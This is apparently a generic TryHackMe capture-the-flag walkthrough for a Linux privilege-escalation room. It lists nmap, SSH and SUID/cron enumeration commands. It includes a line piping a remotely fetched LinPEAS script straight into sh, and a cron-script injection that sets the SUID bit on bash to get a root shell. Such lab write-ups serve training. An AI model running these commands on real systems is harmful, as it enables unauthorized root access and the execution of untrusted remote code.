# 🌑 DarkMatter — TryHackMe Walkthrough

**Room:** [DarkMatter](https://tryhackme.com/room/darkmatter)
**Difficulty:** Easy
**Category:** Linux / Privilege Escalation
**Tags:** Linux, SSH, Privilege Escalation, Enumeration

---

## 📋 Overview

DarkMatter is a Linux-based room focused on enumeration and privilege escalation. You'll gain initial access via SSH and escalate to root through a misconfiguration or known vulnerability, capturing flags along the way.

---  

## 🔧 Tools Used

- `nmap` — Port scanning
- `ssh` — Remote access
- `linpeas.sh` / `linux-smart-enumeration` — Privilege escalation enumeration
- Standard Linux commands

---

## 📡 Step 1: Nmap Scan

```bash
nmap -sV -sC <TARGET_IP>
```

Identify open ports — typically SSH (22) and possibly a web server.

---

## 🔑 Step 2: Initial Access

Use credentials found via enumeration, or attempt common default credentials. Log in via SSH:

```bash
ssh <user>@<TARGET_IP>
```

---

## 📂 Step 3: Enumerate the System

Once on the machine, enumerate for privilege escalation paths:

```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check running processes
ps aux

# Check writable cron jobs
ls -la /etc/cron*
cat /etc/crontab

# Check for interesting files
find / -name "*.txt" 2>/dev/null
```

Run LinPEAS for automated enumeration:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## 🔼 Step 4: Privilege Escalation

Based on enumeration findings, exploit the privilege escalation vector (e.g., SUID binary, writable script in crontab, or sudo misconfiguration):

```bash
# Example: exploiting a SUID binary
/path/to/suid/binary

# Example: editing a cron script
echo "chmod +s /bin/bash" >> /path/to/cron_script.sh
# Wait for cron to run, then:
/bin/bash -p
```

---

## 🚩 Capture the Flags

```bash
# User flag
cat /home/<user>/user.txt

# Root flag
cat /root/root.txt
```

> 🚩 **Flags:** User flag in home directory, root flag in /root.

---

## 📝 Key Takeaways

- Enumeration is the most critical phase of privilege escalation — always check SUID binaries, sudo rights, crontabs, and writable directories.
- Tools like **LinPEAS** automate the process but understanding manual checks is essential.
- SUID binaries can be abused using [GTFOBins](https://gtfobins.github.io/).

---

## 🔗 References

- [GTFOBins](https://gtfobins.github.io/)
- [TryHackMe — DarkMatter Room](https://tryhackme.com/room/darkmatter)
- [Walkthrough Reference](https://aryanstha.medium.com/tryhackme-walkthrough-darkmatter-406d98bf4e38)
